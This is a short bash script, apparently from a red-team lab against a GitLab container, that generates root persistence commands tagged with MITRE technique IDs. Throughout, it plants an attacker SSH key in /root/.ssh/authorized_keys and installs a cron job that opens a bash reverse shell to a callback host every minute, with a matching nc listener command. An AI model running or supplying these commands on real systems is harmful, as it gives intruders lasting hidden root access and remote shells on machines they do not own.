#!/bin/bash
# Persistence via SSH key + cron reverse shell (T1053.003)
# Usage: Run these commands as root on the GitLab container

LHOST="${1:-172.26.0.10}"
LPORT="${2:-4446}"

echo "[*] Persistence Setup (T1053.003 + T1098.004)"
echo "[*] Callback: ${LHOST}:${LPORT}"
echo ""

cat <<'PERSISTENCE_EOF'
=== Run these commands as ROOT on GitLab: ===

# 1. Plant SSH public key (T1098.004 - SSH Authorized Keys)
mkdir -p /root/.ssh
echo "ATTACKER_PUB_KEY_PLACEHOLDER" >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys
chmod 700 /root/.ssh
echo "[+] SSH key planted in /root/.ssh/authorized_keys"

# 2. Create cron reverse shell (T1053.003 - Cron)
CRON_CMD="* * * * * /bin/bash -c 'bash -i >& /dev/tcp/LHOST_PLACEHOLDER/LPORT_PLACEHOLDER 0>&1'"
echo "$CRON_CMD" | crontab -
echo "[+] Cron reverse shell installed (every minute)"

# 3. Verify
echo ""
echo "[*] Verification:"
echo "    SSH keys:"
cat /root/.ssh/authorized_keys
echo ""
echo "    Crontab:"
crontab -l
echo ""
echo "[+] Persistence established!"
echo "[+] SSH: ssh root@GITLAB_IP"
echo "[+] Reverse shell: nc -lvnp LPORT_PLACEHOLDER (connects every minute)"

PERSISTENCE_EOF

echo ""
echo "[*] Generating actual commands with your attacker SSH key..."
echo ""

# Read attacker's public key
ATTACKER_KEY=$(cat /root/.ssh/id_rsa.pub 2>/dev/null || echo "ssh-rsa GENERATE_KEY_FIRST")

echo "# 1. Plant SSH key:"
echo "mkdir -p /root/.ssh && echo '${ATTACKER_KEY}' >> /root/.ssh/authorized_keys && chmod 600 /root/.ssh/authorized_keys"
echo ""
echo "# 2. Install cron reverse shell:"
echo "echo '* * * * * /bin/bash -c \"bash -i >& /dev/tcp/${LHOST}/${LPORT} 0>&1\"' | crontab -"
echo ""
echo "# 3. Verify SSH access from attacker:"
echo "ssh -i /root/.ssh/id_rsa root@172.26.0.30"
